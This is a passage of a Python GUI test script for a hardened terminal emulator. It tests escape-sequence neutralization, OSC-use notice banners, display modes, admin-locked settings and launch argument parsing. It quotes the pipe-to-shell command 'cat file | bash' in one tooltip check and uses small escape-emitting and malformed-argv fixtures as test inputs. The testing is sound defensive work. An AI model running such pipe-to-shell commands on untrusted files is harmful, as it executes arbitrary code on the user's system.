tt._append('x' + chr(0x20AC))                 # euro renders as the <U+20AC> badge
pump(20)
_i = tt.toPlainText().index('<U+20AC>') + 3
_c = tt.textCursor()
_c.setPosition(_i)
_rect = tt.cursorRect(_c)
_vp = _rect.center()
_hv = QHelpEvent(QEvent.Type.ToolTip, _vp, tt.viewport().mapToGlobal(_vp))
tt.event(_hv)
pump(20)
ok(QToolTip.isVisible() and 'EURO SIGN' in QToolTip.text(),
   'hovering a reveal badge shows the code-point tooltip')
QToolTip.hideText()

# --- window: rename, colour, settings round-trip ------------------------------
from secure_terminal.main import (                   # noqa: E402
    MainWindow, _is_font_noise, _read_version, APP_VERSION,
)
from secure_terminal import settings                 # noqa: E402

# version: baked from debian/changelog at build, read at runtime, fail open
eq(_read_version(['/no/such/version']), 'unknown', 'missing version file -> unknown')
_vfd, _vf = tempfile.mkstemp(prefix='st-version-')
os.close(_vfd)
with open(_vf, 'w', encoding='utf-8') as _vh:
    _vh.write('1.2.3-4\n')
eq(_read_version([_vf]), '1.2.3-4', 'version file is read and stripped')
os.remove(_vf)
ok(isinstance(APP_VERSION, str) and APP_VERSION, 'APP_VERSION is a non-empty string')

# font-shaping warning filter: the qt.text.font.db flood is dropped, real
# messages pass through
ok(_is_font_noise('qt.text.font.db', 'OpenType support missing for "X", script 9'),
   'font-db warning is noise')
ok(_is_font_noise('', 'OpenType support missing for "Y"'), 'OpenType line is noise')
ok(not _is_font_noise('default', 'some real warning'), 'real message is not noise')
# #11: only the OpenType-missing message is noise -- a DIFFERENT qt.text.font.db warning
# (e.g. a font substitution that may reintroduce a confusable) must still reach stderr.
# The pre-fix `category == 'qt.text.font.db' or ...` swallowed the whole category.
ok(not _is_font_noise('qt.text.font.db', 'Populating font family aliases took 50 ms'),
   'a non-OpenType qt.text.font.db warning is NOT suppressed (only the flood message is)')

win = MainWindow()
win.new_tab()
# an advisory from a terminal surfaces as the window's dismissible banner, OUTSIDE
# any terminal document (never injected, so it cannot be copied as program output).
from PyQt6.QtWidgets import QPushButton as _QPushButton     # noqa: E402
# isHidden(), not isVisible(): the top-level window is never show()n here, so
# isVisible() is False for any child; isHidden() reflects the widget's own flag.
ok(win._banner.isHidden(), 'the advisory banner starts hidden')
win.current().advise_signal.emit('switch to TUI mode to view this program')
ok(not win._banner.isHidden() and 'TUI' in win._banner_label.text(),
   'a terminal advisory shows the window banner (not injected into the terminal)')
ok('switch to TUI' not in win.current().toPlainText(),
   'the advisory text is not injected into the terminal document')
win._banner.findChild(_QPushButton).click()                # the close (X) button
ok(win._banner.isHidden(), 'the banner X button dismisses it')
# an advisory belongs to the tab that raised it, not the whole window: it shows
# only while that tab is current, never over an unrelated tab (codex P2 fix).
ok(win.tabs.count() >= 2, 'two tabs available for the per-tab banner check')
_tabA = win.tabs.widget(0)
_tabB = win.tabs.widget(1)
win.tabs.setCurrentWidget(_tabA)
_tabA.advise_signal.emit('tab A: switch to TUI mode')
ok(not win._banner.isHidden() and 'tab A' in win._banner_label.text(),
   'the advisory shows while its own tab (A) is current')
win.tabs.setCurrentWidget(_tabB)
ok(win._banner.isHidden(), 'the advisory does not hang over a different tab (B)')
win.tabs.setCurrentWidget(_tabA)
ok(not win._banner.isHidden() and 'tab A' in win._banner_label.text(),
   'switching back to tab A shows its own advisory again')
win._dismiss_advisory()
ok(win._banner.isHidden(), 'dismiss clears the current tab advisory')
# OSC-use notice: a program using an OSC escape (stripped in CLI mode) raises the
# banner at most once per TYPE per tab; the type is named.
ok(win._osc_notice, 'the OSC-use notice is on by default')
_octab = win.current()
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab}
_octab.osc_used.emit('osc_clipboard')
ok(not win._banner.isHidden() and 'clipboard' in win._banner_label.text().lower(),
   'an OSC escape raises the notice banner, naming the type')
win._dismiss_advisory()
_octab.osc_used.emit('osc_clipboard')   # the SAME type again does not re-show
ok(win._banner.isHidden(), 'the OSC notice fires only once per type per tab')
_octab.osc_used.emit('osc_hyperlink')   # a DIFFERENT type does show
ok(not win._banner.isHidden() and 'hyperlink' in win._banner_label.text().lower(),
   'a different OSC type raises its own notice')
win._dismiss_advisory()
# disabled globally: a fresh tab's OSC shows nothing; re-enabling re-arms it.
win.new_tab()
_octab2 = win.current()
win.set_osc_notice(False)
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_clipboard')
ok(win._banner.isHidden(), 'the OSC notice is suppressed when notices are all off')
ok((_octab2, 'osc_clipboard') not in win._osc_notified,
   'a suppressed notice does not consume the per-type state')
win.set_osc_notice(True)
_octab2.osc_used.emit('osc_clipboard')
ok(not win._banner.isHidden(), 're-enabling the toggle re-arms the OSC notice')
win._dismiss_advisory()
# per-TYPE mute: muting clipboard notices silences that type but not others.
win.set_osc_notice_type('osc_clipboard', False)
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_clipboard')
ok(win._banner.isHidden(), 'a per-type muted OSC notice does not show')
_octab2.osc_used.emit('osc_colors')
ok(not win._banner.isHidden(), 'a non-muted OSC type still notifies')
win.set_osc_notice_type('osc_clipboard', True)
win._dismiss_advisory()
# turning notices OFF while showing dismisses the banner immediately.
_octab2.osc_used.emit('osc_cwd')
win.set_osc_notice(False)
ok(win._banner.isHidden(), 'switching OSC notices off dismisses a showing banner')
win.set_osc_notice(True)
# enabling "allow title / notifications" clears a stale OSC notice.
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_title')
ok(not win._banner.isHidden(), 'an OSC notice is showing again')
win.set_allow_title(True)
ok(win._banner.isHidden(), 'enabling program title/notifications clears the OSC notice')
win.set_allow_title(False)
win._dismiss_advisory()
# granular OSC controls: a per-feature menu toggle for every OSC feature, applied
# to the tab, persisted, and reflected by the OSC security lamp (green/yellow/red).
ok(set(win._osc_actions) == {f[0] for f in _S.OSC_FEATURES},
   'every OSC feature has its own menu toggle')
ok(win._osc_level()[0] == '#1f8a54', 'the OSC lamp is green when all features are off')
win.set_osc('osc_hyperlink', True)                    # medium risk
ok(win._osc_level()[0] == '#e5a50a' and win.current().osc_enabled('osc_hyperlink')
   and win._osc_actions['osc_hyperlink'].isChecked(),
   'enabling a medium OSC feature dims the lamp to yellow, applies to the tab, checks the menu')
win.set_osc('osc_clipboard', True)                    # high risk
ok(win._osc_level()[0] == '#e5484d', 'enabling a high-risk OSC feature turns the lamp red')
win.set_osc('osc_hyperlink', False)
win.set_osc('osc_clipboard', False)
ok(win._osc_level()[0] == '#1f8a54', 'the lamp returns to green when the features are disabled')
# and the terminal actually EMITS osc_used (once) when a PROGRAM sends OSC to its
# stdout in line mode, and never shows the OSC text in the document. Drive it from
# a program (not typed input, which the tty would echo back in caret form).
_oscsh = os.path.join(tempfile.mkdtemp(prefix='st-osc-'), 'osc.sh')
with open(_oscsh, 'w') as _f:
    _f.write('#!/bin/sh\n'
             'printf "\\033]2;secret-title\\007visible\\n"\n'
             'printf "\\033]0;another\\007more\\n"\n'
             'sleep 2\n')
os.chmod(_oscsh, 0o700)
oscterm = SecureTerminal(command=_oscsh)
_oscfired = []
oscterm.osc_used.connect(lambda key: _oscfired.append(key))
oscterm.resize(400, 200)
oscterm.show()
pump(300)
ok(len(_oscfired) >= 1, 'the terminal emits osc_used for OSC output in CLI mode')
_osctext = oscterm.toPlainText()
ok('secret-title' not in _osctext and 'another' not in _osctext,
   'the OSC title text is never shown in the document')
ok('visible' in _osctext, 'the program output around the OSC still shows')
# finding: in TUI mode an OSC is NOT flagged "ignored" -- a title/notification may
# be handled there (allow_title), so a contradictory notice must not fire.
if tui_available():
    _tuiosc = SecureTerminal(command=_oscsh, tui=True)
    _tuifired = []
    _tuiosc.osc_used.connect(lambda key: _tuifired.append(key))
    _tuiosc.resize(400, 200)
    _tuiosc.show()
    pump(300)
    ok(not _tuifired, 'TUI mode does not flag an OSC as ignored (it may be handled)')
# turning on TUI mode auto-dismisses a "use TUI mode" (tui-kind) advisory, but NOT
# an unrelated OSC notice on the same tab (codex P2: only TUI hints are stale).
# Box mode so the switch raises no auto-Box notice of its own -- this asserts the
# tui-hint/OSC-notice handling in isolation.
_tuitab = win.current()
win.set_mode('box')
win._on_advise(_tuitab, 'This program wants a full-screen interface. Turn on TUI.')
ok(not win._banner.isHidden(), 'the full-screen advisory is showing before the switch')
win.set_tui(True)
ok(win._banner.isHidden(), 'switching to TUI auto-dismisses the "use TUI mode" banner')
win.set_tui(False)
win._on_advise(_tuitab, 'An application used an OSC escape ...', 'osc')
ok(not win._banner.isHidden(), 'an OSC notice is showing')
win.set_tui(True)
ok(not win._banner.isHidden(), 'enabling TUI does NOT dismiss the OSC notice')
win.set_tui(False)
win._dismiss_advisory()
QInputDialog.getText = staticmethod(lambda *a, **k: ('build', True))
win.rename_tab(0)
eq(win.tabs.tabText(0), 'build', 'tab rename')
win.set_tab_color(0, QColor('#d83933'))
ok(not win.tabs.tabIcon(0).isNull(), 'tab colour set')
_term0 = win.tabs.widget(0)
ok(win._tab_colors.get(_term0) == '#d83933', 'tab colour stored')
win.set_tab_color(0, None)
# the numbered swatch is unconditional, so a null icon can never be the signal;
# _tab_colors is the only state that answers the question.
ok(not win.tabs.tabIcon(0).isNull(), 'tab keeps its number icon after colour cleared')
ok(win._tab_colors.get(_term0) is None, 'tab colour cleared')
# COR-6: the Custom... colour picker returns an INVALID QColor on Cancel, which
# set_tab_color folds into its Clear path -- so passing it straight through erased the
# tab's colour on Cancel. _pick_custom_tab_color guards on isValid(): Cancel is a no-op.
from PyQt6.QtWidgets import QColorDialog as _QCD              # noqa: E402
ok(hasattr(win, '_pick_custom_tab_color'),
   'COR-6: a guarded custom-colour picker (isValid) exists')
if hasattr(win, '_pick_custom_tab_color'):
    win.set_tab_color(0, QColor('#d83933'))
    _o_getcolor = _QCD.getColor
    try:
        _QCD.getColor = staticmethod(lambda *a, **k: QColor())            # invalid = Cancel
        win._pick_custom_tab_color(0)
        ok(win._tab_colors.get(_term0) == '#d83933',
           'COR-6: Custom... Cancel (invalid QColor) leaves the tab colour unchanged')
        _QCD.getColor = staticmethod(lambda *a, **k: QColor('#1f8a54'))   # a real pick
        win._pick_custom_tab_color(0)
        ok(win._tab_colors.get(_term0) == '#1f8a54',
           'COR-6: Custom... with a valid pick applies the colour')
    finally:
        _QCD.getColor = _o_getcolor
        win.set_tab_color(0, None)

# COR-4: a COPY review held with the terminal focused -- Enter/Esc must dispatch the COPY
# reject, not the paste path (which would clear _pending_paste and strand _pending_copy).
_cr = SecureTerminal(command='/bin/cat', tui=True)
_cr.apply_copy_warn('always')
feed_output(_cr, b'hello')
QGuiApplication.clipboard().setText('SENTINEL')
_cr.selectAll()
_cr.copy()
ok(_cr._pending_copy is not None and _cr._review_active,
   'COR-4 setup: selectAll + copy opens a pending copy review')
key(_cr, Qt.Key.Key_Return)
ok(_cr._pending_copy is None,
   'COR-4: Enter on a copy review dispatches the copy reject (no stale _pending_copy)')
_cr.close()
# --- find in scrollback: per-tab + all-tabs, over the neutralized display text ---
from PyQt6.QtGui import QTextCursor as _QTC                  # noqa: E402
_ft = win.current()
_ft.document().setPlainText('')
# Reset the LINE state with the document: the shell's prompt is still in the cell
# buffer, so the fed text would continue that row and autowrap mid-word once the
# prompt is long enough -- making the match count depend on the cwd's length.
_ft._line_cells, _ft._line_col, _ft._out_cursor = [], 0, None
feed_output(_ft, b'alpha beta\r\ndelta alpha\r\nzeta ALPHA\r\nno match\r\n')
win.show_find()
ok(not win._find_bar.isHidden(), 'Ctrl+Shift+F shows the find bar')
win._find_bar.all_tabs.setChecked(False)
win._find_bar.case.setChecked(False)
win._find_bar.input.setText('alpha')
win._find_update()
ok(len(_ft.extraSelections()) == 3,
   'case-insensitive find highlights every match (alpha x2 + ALPHA)')
eq(win._find_bar.count.text(), '3 matches', 'the match count is shown')
win._find_bar.case.setChecked(True)
win._find_update()
ok(len(_ft.extraSelections()) == 2, 'case-sensitive find excludes ALPHA')
# next/prev move the caret to a match and it is a real selection of the query
win._find_bar.case.setChecked(False)
win._find_update()
win._find_step(False)
ok(_ft.textCursor().selectedText().lower() == 'alpha',
   'Next selects a match')
# the find only ever sees display text: a query for an escape byte finds nothing
win._find_bar.input.setText('\x1b')
win._find_update()
eq(win._find_bar.count.text(), 'no matches',
   'a search for an escape byte finds nothing (only neutralized text is searchable)')
# all-tabs search: a match in ANOTHER tab is found and activates that tab
win._find_bar.input.setText('alpha')
win.new_tab()
_ft2 = win.current()
_ft2.document().setPlainText('')
feed_output(_ft2, b'unique-needle-xyz here\r\n')
win.tabs.setCurrentIndex(win.tabs.indexOf(_ft))    # start on the first tab
win._find_bar.all_tabs.setChecked(True)
win._find_bar.input.setText('unique-needle-xyz')
win._find_update()
win._find_step(False)
eq(win.current(), _ft2, 'all-tabs Next hops to the tab that has the match')
# tooltips render as an interactive, zoom-aware InfoTip (selectable + copyable),
# not the plain QToolTip you cannot enter.
from PyQt6.QtGui import QHelpEvent as _QHelpEvent            # noqa: E402
from PyQt6.QtCore import QEvent as _QEvent, QPoint as _QP    # noqa: E402
_tipbtn = _QPushButton('TUI')
_tipbtn.setToolTip('Opt-in TUI mode: higher risk, only run programs you trust.')
_filt = win._tip_filter
_he = _QHelpEvent(_QEvent.Type.ToolTip, _QP(3, 3), _tipbtn.mapToGlobal(_QP(3, 3)))
ok(_filt.eventFilter(_tipbtn, _he) is True,
   'the tooltip event is intercepted (plain QToolTip suppressed)')
_tip = _filt._tip
ok(not _tip.isHidden(), 'an InfoTip is shown for a tooltip')
ok('only run programs you trust' in _tip.text(), 'the InfoTip carries the tooltip text')
ok(bool(_tip.textInteractionFlags()
        & Qt.TextInteractionFlag.TextSelectableByMouse),
   'the InfoTip text is selectable (can be copied)')
# the InfoTip font scales with the current tab zoom
win.current().apply_zoom(200)
_he2 = _QHelpEvent(_QEvent.Type.ToolTip, _QP(3, 3), _tipbtn.mapToGlobal(_QP(3, 3)))
_filt.eventFilter(_tipbtn, _he2)
_big = _tip.font().pointSizeF()
win.current().apply_zoom(100)
_filt.eventFilter(_tipbtn, _he2)
_small = _tip.font().pointSizeF()
ok(_big > _small, 'the InfoTip font grows with zoom')
_tip.hide()
win.hide_find()
ok(win._find_bar.isHidden(), 'Esc/close hides the find bar')
ok(len(_ft.extraSelections()) == 0 and len(_ft2.extraSelections()) == 0,
   'closing find clears all match highlights')
# window tab actions: previous-tab wraps around, goto jumps by position, select
# all selects the current buffer, full screen toggles
win.new_tab()
win.new_tab()
_cnt = win.tabs.count()
win.tabs.setCurrentIndex(0)
win._on_tab_step(-1)
eq(win.tabs.currentIndex(), _cnt - 1, 'previous-tab wraps to the last tab')
win._goto_tab(0)
eq(win.tabs.currentIndex(), 0, 'goto tab 1 by position')
win.current()._append('pick me')
win.select_all()
ok(bool(win.current().textCursor().selectedText()), 'select all selects the buffer')
win.toggle_fullscreen(True)
ok(win.isFullScreen(), 'full screen on')
win.toggle_fullscreen(False)
# unicode display is four mutually-exclusive buttons (Box/Reveal/Detail/Show),
# default detail, colour-coded by safety
win.act_box.trigger()
ok(win.act_box.isChecked() and win.current().current_mode() == 'box',
   'Box button selects box')
win.act_show.trigger()
_checked = sum(a.isChecked() for a in (win.act_box, win.act_reveal, win.act_show))
eq((win.current().current_mode(), _checked), ('show', 1),
   'Show button selects show, exclusively (only one checked)')
win.act_reveal.trigger()
eq(win.current().current_mode(), 'reveal', 'Reveal button selects reveal')
ok(not win.act_box.icon().isNull() and not win.act_show.icon().isNull(),
   'mode buttons carry icons')
# security indicator: two lamps. display axis (show=red, reveal=green [safe and
# lossless], box=green [safe -- the neutralized char is a hard-to-miss coloured
# box, though lossy]) and mode axis (TUI=yellow, line=green).
win.set_mode('box')
eq((win._display_level()[1], win._display_level()[0]), ('Box', '#1f8a54'),
   'box display -> green (safe; the box placeholder is hard to miss)')
win.set_mode('reveal')
eq((win._display_level()[1], win._display_level()[0]), ('Reveal', '#1f8a54'),
   'reveal display -> green (safe and lossless, not red)')
win.set_mode('show')
eq((win._display_level()[1], win._display_level()[0]), ('Show', '#d83933'),
   'show display -> red')
# the box display mode is labelled "Box" (it draws a box; it does not strip the
# data stream), and its tooltip says it is a DISPLAY setting -- not the bytes a
# program pipes elsewhere, so "cat file | bash" runs regardless.
eq(win.act_box.text(), '&Box', 'the box display mode is user-labelled Box')
ok('cat file | bash' in win.act_box.toolTip(),
   'the Box tooltip clarifies it is display-only, not bytes piped elsewhere')
eq(win._mode_level()[1], 'CLI', 'CLI mode -> green mode lamp')
if tui_available():
    win.set_tui(True)
    eq((win._mode_level()[1], win._mode_level()[0]), ('TUI', '#e5a50a'),
       'TUI -> yellow mode lamp (independent of the display lamp)')
    win.set_tui(False)
    # Box and Show already render full-screen, so entering TUI leaves them as the
    # user set them (no auto-switch, no restore state).
    win.set_mode('box')
    win.set_tui(True)
    eq(win.current().current_mode(), 'box', 'TUI leaves Box as Box (renders full-screen)')
    ok(win.current() not in win._pre_tui_mode, 'a Box tab needs no restore state in TUI')
    win.set_tui(False)
    # Reveal/Detail cannot expand a codepoint in the fixed grid, so entering TUI
    # auto-switches this TAB to Box (which still marks every byte) WITHOUT persisting
    # Box as the global default, and disables the Reveal/Detail controls. Turning
    # TUI off restores the prior mode and re-enables them.
    win.set_mode('detail')
    win.set_tui(True)
    eq(win.current().current_mode(), 'box', 'TUI auto-switches Detail to Box')
    eq(win._default_mode, 'detail',
       'TUI does NOT persist the auto-Box as the global default')
    ok(not win.act_reveal.isEnabled() and not win.act_detail.isEnabled(),
       'Reveal/Detail controls are disabled while the tab is in TUI')
    ok(win.act_box.isEnabled() and win.act_show.isEnabled(),
       'Box and Show stay selectable in TUI')
    ok(not win._mode_buttons['reveal'].isEnabled()
       and not win._mode_buttons['detail'].isEnabled(),
       'the Reveal/Detail toolbar chips are disabled in TUI too')
    win.set_tui(False)
    eq(win.current().current_mode(), 'detail',
       'turning TUI off restores the prior mode (Detail)')
    ok(win.act_reveal.isEnabled() and win.act_detail.isEnabled(),
       'Reveal/Detail re-enabled after leaving TUI')
    ok(win._mode_buttons['reveal'].isEnabled()
       and win._mode_buttons['detail'].isEnabled(),
       'the Reveal/Detail chips re-enabled after leaving TUI')
    win.set_mode('box')

# The passive "switched to Box" notice: fires on the auto-switch when on, clears on
# CLI, and stays silent when the setting is off (the switch itself is unconditional).
if tui_available():
    _nt = win.current()
    win.set_tui(False)
    win._dismiss_advisory()                    # start from a clean banner
    win.set_tui_autobox_notice(True)
    win.set_mode('detail')
    win.set_tui(True)
    eq(win._advisories.get(_nt, (None,))[0], 'autobox',
       'entering TUI raises the auto-Box notice when the setting is on')
    ok(not win._banner.isHidden(), 'the auto-Box banner is showing')
    win.set_tui(False)
    ok(win._advisories.get(_nt) is None,
       'leaving TUI clears the auto-Box notice and restores the mode')
    eq(win.current().current_mode(), 'detail', 'the prior mode (Detail) is restored')
    # notice OFF: the tab still boxes, but no banner is raised
    win.set_tui_autobox_notice(False)
    win.set_mode('reveal')
    win.set_tui(True)
    eq(win.current().current_mode(), 'box',
       'the auto-Box switch still happens with the notice off')
    ok(win._advisories.get(_nt) is None, 'the notice off raises no banner')
    win.set_tui(False)
    # a showing notice is dropped the moment the setting is switched off
    win.set_tui_autobox_notice(True)
    win.set_mode('detail')
    win.set_tui(True)
    ok(win._advisories.get(_nt, (None,))[0] == 'autobox', 'a notice is showing')
    win.set_tui_autobox_notice(False)
    ok(win._advisories.get(_nt) is None,
       'switching the notice off clears a showing auto-Box banner')
    win.set_tui(False)
    win.set_tui_autobox_notice(True)
    win.set_mode('box')

# the /mode slash command is refused for Reveal/Detail while the tab owns the TUI
# grid (it bypasses the disabled chips, so the choke point is in set_mode).
if tui_available():
    win.set_mode('box')
    win.set_tui(True)
    win.run_command('mode reveal')
    eq(win.current().current_mode(), 'box',
       '/mode reveal is refused while the tab is in TUI (mode unchanged)')
    win.run_command('mode show')
    eq(win.current().current_mode(), 'show',
       '/mode show still applies in TUI (Show renders full-screen)')
    win.set_tui(False)
    win.set_mode('box')

# an admin-locked display mode is a deliberate hardening choice: entering TUI must
# NOT auto-switch it, and the controls are left to _apply_locks (not re-enabled).
if tui_available():
    _lm = win.current()
    win.set_tui(False)
    _lm.apply_mode('detail')               # force the term mode past the locked setter
    _saved_locks = set(win._locked)
    try:
        win._locked = {'unicode_mode'}
        win.set_tui(True)
        eq(_lm.current_mode(), 'detail',
           'a locked mode is respected: TUI does not auto-Box it')
    finally:
        win._locked = _saved_locks
        win.set_tui(False)
    _lm.apply_mode('box')
    win.set_mode('box')

# a closed auto-Boxed tab must not linger in _pre_tui_mode (else the terminal leaks)
if tui_available():
    win.set_mode('detail')
    win.new_tab(tui=True)                       # a TUI tab born in Detail -> auto-Boxed
    _leak = win.current()
    ok(_leak in win._pre_tui_mode, 'the auto-Boxed tab recorded its pre-TUI mode')
    win.close_tab(win.tabs.indexOf(_leak))
    ok(_leak not in win._pre_tui_mode,
       'closing an auto-Boxed tab clears its _pre_tui_mode entry (no leak)')
    win.set_mode('box')

# the autobox notice must NOT clobber a pending OSC notice (security-relevant, de-duped):
# the greyed controls convey the switch, so the OSC banner wins the one-per-tab slot.
if tui_available():
    _oc = win.current()
    win.set_tui(False)
    win._dismiss_advisory()
    win.set_tui_autobox_notice(True)
    win.set_mode('detail')
    win._on_advise(_oc, 'An application used an OSC escape ...', 'osc')
    eq(win._advisories.get(_oc, (None,))[0], 'osc', 'an OSC notice is pending')
    win.set_tui(True)                           # auto-Box fires, but must not clobber osc
    eq(win.current().current_mode(), 'box', 'the tab still auto-switched to Box')
    eq(win._advisories.get(_oc, (None,))[0], 'osc',
       'the pending OSC notice survives the auto-Box (not clobbered)')
    win.set_tui(False)
    win._dismiss_advisory()
    win.set_mode('box')

# a plain tab switch must not mutate persisted settings (setChecked on toggled
# actions is blocked): flip colours off on tab B, switch away and back.
_before_colors = win._default_colors
win.new_tab()
win.set_colors(not _before_colors)
_toggled = win._default_colors
win._goto_tab(0)                       # switch away (fires setChecked, blocked)
win._goto_tab(win.tabs.count() - 1)    # and back
eq(win._default_colors, _toggled, 'tab switch does not rewrite the colours default')
win.set_mode('box')
ok(not win.sec_display.icon().isNull() and not win.sec_mode.icon().isNull(),
   'both security lamps show an icon')
# About dialog builds without error (patch exec so the modal does not block)
from PyQt6.QtWidgets import QDialog as _QDialog          # noqa: E402
_orig_exec = _QDialog.exec
_QDialog.exec = lambda _self: 0
try:
    win.show_about()
    win._show_security_details()
    ok(True, 'About + security-detail dialogs build without error')
finally:
    _QDialog.exec = _orig_exec
# global settings apply to every open tab and update the defaults
win.new_tab()
win._apply_global({'theme': 'light', 'zoom': 130, 'mode': 'reveal',
                   'colors': True, 'line_edits': True, 'tui': False,
                   'tui_autobox_notice': True,
                   'osc': {'osc_title': True, 'osc_clipboard': True},
                   'scrollback': 1000, 'paste_delay': 5, 'escape_limit': 4096,
                   'persist': True})
ok(all((win.tabs.widget(i).current_theme(), win.tabs.widget(i).current_mode(),
        win.tabs.widget(i).current_scrollback()) == ('light', 'reveal', 1000)
       for i in range(win.tabs.count())),
   'global settings applied to every open tab')
ok(all(win.tabs.widget(i).osc_enabled('osc_title')
       and win.tabs.widget(i).osc_enabled('osc_clipboard')
       for i in range(win.tabs.count())),
   'global settings apply the granular OSC toggles to every tab')
win._apply_global({'theme': 'light', 'zoom': 130, 'mode': 'reveal', 'colors': True, 'line_edits': True,
                   'tui': False, 'tui_autobox_notice': True,
                   'osc': {'osc_title': False, 'osc_clipboard': False},
                   'scrollback': 1000, 'paste_delay': 5, 'escape_limit': 4096,
                   'persist': True})
eq(win._default_mode, 'reveal', 'global settings updated the default mode')
# slash-command palette: applies settings, leading slash optional, invalid -> False
ok(win.run_command('/theme light') and win.current().current_theme() == 'light',
   'command /theme light')
ok(win.run_command('mode reveal') and win.current().current_mode() == 'reveal',
   'command mode reveal (no leading slash)')
ok(win.run_command('/colors on') and win.current().colors_enabled(),
   'command /colors on')
ok(win.run_command('/zoom 150') and win.current().current_zoom() == 150,
   'command /zoom 150')
ok(not win.run_command('/bogus xyz'), 'unknown command returns False')
win.set_theme('light')
win.set_zoom(140)
win.set_mode('reveal')
win.close()
cfg = settings.load()
eq(cfg.get('theme'), 'light', 'setting persisted theme')
eq(cfg.get('zoom'), '140', 'setting persisted zoom')
eq(cfg.get('unicode_mode'), 'reveal', 'setting persisted mode')

# --- admin-locked settings (hardening: a privileged drop-in wins, user ignored)
_sysd = tempfile.mkdtemp(prefix='st-sys-')
_usrd = tempfile.mkdtemp(prefix='st-usr-')
_orig_sys, _orig_usr = settings._system_dirs, settings._user_config_dir
settings._system_dirs = lambda: [_sysd]
settings._user_config_dir = lambda: _usrd
try:
    with open(os.path.join(_sysd, '30_default.conf'), 'w') as _f:
        _f.write('tui=false\ncolors=false\nunicode_mode=box\n'
                 'lock=tui,colors,unicode_mode\n')
    with open(os.path.join(_usrd, '50_user.conf'), 'w') as _f:
        _f.write('colors=true\ntui=true\ntheme=light\nlock=colors\n')
    lc = settings.load()
    eq(lc.get('colors'), 'false', 'locked colours keep the admin value')
    eq(lc.get('tui'), 'false', 'locked tui keeps the admin value')
    eq(lc.get('theme'), 'light', 'an UNlocked key still lets the user win')
    eq(sorted(lc.locked), ['colors', 'remote_control', 'tui', 'unicode_mode'],
       'locked = admin locks + the always-privileged remote_control')
    eq(sorted(lc.violations), ['colors', 'tui'],
       'ignored user overrides of locked keys are recorded')
    # the window disables the locked controls and guards the setters
    lw = MainWindow()
    ok(not lw.act_colors.isEnabled() and not lw.act_tui.isEnabled()
       and all(not a.isEnabled() for a in lw._mode_actions.values()),
       'locked controls are greyed out in the UI')
    ok(lw._locked_violations, 'the window surfaces the locked-override violation')
    lw.set_colors(True)
    ok(not lw._default_colors, 'set_colors is a no-op when colours are locked')
    lw.set_mode('show')
    ok(lw._default_mode != 'show', 'set_mode is a no-op when the mode is locked')
    lw.close()
    # save() must never write a locked key back to the (dead) user config
    settings.save({'colors': 'true', 'theme': 'dark'}, locked=lc.locked)
    with open(settings.user_config_file()) as _wf:
        _written = _wf.read()
    ok('colors=' not in _written and 'theme=dark' in _written,
       'save drops locked keys, keeps unlocked ones')
finally:
    settings._system_dirs, settings._user_config_dir = _orig_sys, _orig_usr

# --- launch CLI parsing (--title/--tui/--mode/--class/--tab/-- command) -------
from secure_terminal.main import _parse_launch_args as _pla       # noqa: E402
eq(_pla(['--title', 'logs', '--tui', '--mode', 'reveal']).tabs,
   [{'title': 'logs', 'tui': True, 'mode': 'reveal', 'command': None,
     'colors': None, 'line_edits': None, 'bell': None, 'osc': None}],
   'cli: single-tab options')
# per-tab settings overrides parse into the tab spec
_ps = _pla(['--colors', '--bell', 'audible,visual', '--osc', 'osc_clipboard_read',
            '--osc', 'osc_title']).tabs[0]
eq((_ps['colors'], _ps['bell'], _ps['osc']),
   (True, 'audible,visual', ['osc_clipboard_read', 'osc_title']),
   'cli: per-tab colours/bell/osc(repeatable) parse')
eq(_pla(['--no-colors']).tabs[0]['colors'],
   False, 'cli: --no-colors turns a tab setting off')
# the line-editing opt-out is reachable from the command line too, and a tab that
# only carries it is NOT an empty spec (it must open a tab, not fall through to
# the normal restore-or-default startup)
eq(_pla(['--no-line-edits']).tabs[0]['line_edits'],
   False, 'cli: --no-line-edits opts a tab out of line editing')
eq(_pla(['--line-edits']).tabs[0]['line_edits'],
   True, 'cli: --line-edits opts a tab back in')
eq(len(_pla(['--no-line-edits']).tabs), 1,
   'cli: a --no-line-edits-only spec still counts as a requested tab')
eq(_pla(['--', 'htop', '--no-color']).tabs[0]['command'], ['htop', '--no-color'],
   'cli: -- gives a real argv (no shell reparse)')
eq(_pla(['-e', 'ls -la']).tabs[0]['command'], 'ls -la',
   'cli: -e gives a shell-split string')
_lc = _pla(['--class', 'MyTerm', '--name', 'inst'])
eq((_lc.wm_class, _lc.wm_name), ('MyTerm', 'inst'), 'cli: WM class/name parsed')
eq([(t['title'], t['tui']) for t in
    _pla(['--tab', '--title', 'A', '--tab', '--title', 'B', '--tui']).tabs],
   [('A', None), ('B', True)], 'cli: --tab multi-tab, no empty leading tab')
eq(_pla([]).tabs, [], 'cli: bare launch specifies no tabs (normal startup)')
eq(_pla(['--title', 'a', '--tab', '--title', 'b', '--', 'sleep', '9'])
   .tabs[-1]['command'], ['sleep', '9'], 'cli: -- command attaches to last tab')
# robustness: adversarial / malformed argv must never crash uncaught (argparse
# may SystemExit on a bad option, which is correct for a CLI; nothing else raises)
for _argv in ([], ['--'], ['--', '--tab', '--title'], ['--tab'], ['--tab', '--tab'],
              ['--title'], ['--mode', 'bogus'], ['--class'], ['-e'],
              ['--', '-e', '--tab', '--'], ['\x00', '\x1b', '--tab', 'x'],
              ['--tab'] * 50):
    try:
        _r = _pla(_argv)
        ok(isinstance(_r.tabs, list), 'cli: argv %r -> a valid spec' % (_argv[:3],))
    except SystemExit:
        ok(True, 'cli: argv %r rejected cleanly (argparse exit)' % (_argv[:3],))
_lw = MainWindow(launch=_pla(['--title', 'mytab', '--mode', 'reveal',
                              '--', 'sleep', '30']))
pump(150)
eq(_lw.tabs.tabText(0), 'mytab', 'launch: tab title applied')
eq(_lw.current().current_mode(), 'reveal', 'launch: display mode applied')
_lw.close()

# a launch tab APPLIES its per-tab overrides (osc feature + bell channels)
_lo = MainWindow(launch=_pla(['--osc', 'osc_clipboard_read', '--bell', 'visual',
                              '--', 'sleep', '30']))
pump(150)
_lot = _lo.current()
ok(_lot.osc_enabled('osc_clipboard_read'),
   'launch: --osc enables the named OSC feature for that tab only')
eq(_lot.bell_channels(), {'visual'}, 'launch: --bell sets the tab bell channels')
_lo.close()

# an admin lock ALWAYS wins over a CLI per-tab override
